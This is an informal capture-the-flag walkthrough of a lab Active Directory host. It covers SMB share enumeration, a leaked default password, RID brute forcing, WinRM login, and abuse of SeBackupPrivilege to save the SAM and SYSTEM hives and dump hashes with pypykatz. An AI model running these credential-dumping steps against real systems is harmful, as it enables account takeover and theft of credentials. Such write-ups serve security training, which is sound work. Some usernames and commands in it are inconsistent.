Started with a nmap scan
```
53 Simple DNS Plus
88 Kerberos
135 RPC
139 netbios-ssn
389 AD Ldap domain: cicada.htb DNS=CICADA-DC.cicada.htb
445 microsoft-ds
464 kpasswd5
593 ncan_http
636 ssl LDAP
3268 AD LDAP
3269 LDAP ssl
5985 Microsoft HTTP API 2.0 
55567 unknown
```
First were going to start with the smb we can list out the shares `smbclient -L 10.10.11.35` and we got 2 non standard shares `HR, DEV` lets see if we can access them we can only access `HR` and there is a txt file notice from HR when downloading the file we need to use `"` around the file name we got a default password `Cicada$M6Corpb*@Lp#nZp!8` doing a rid brute force we got some users on the host 
```
john.smoulder
michel.wrightson
david.orelious
emily.oscars
```
and we have access to `michael.wrightson` and we can `evil-winrm` into the host and we can exploit `SEBackupprivillege` to get to system admin so first thing we do is run `whoami /priv` and we can see we have the backup privilege so lets make a temp folder and then we can save the sam and system files to the folder so we run `reg save hklm\sam C:\USers\michel.wrighton\Documents` 
and then the same for the system file they we download the files to are host machine and run `pypykatz registry --sam sam system` and then we can use the hashes it gives us to winrm into the host 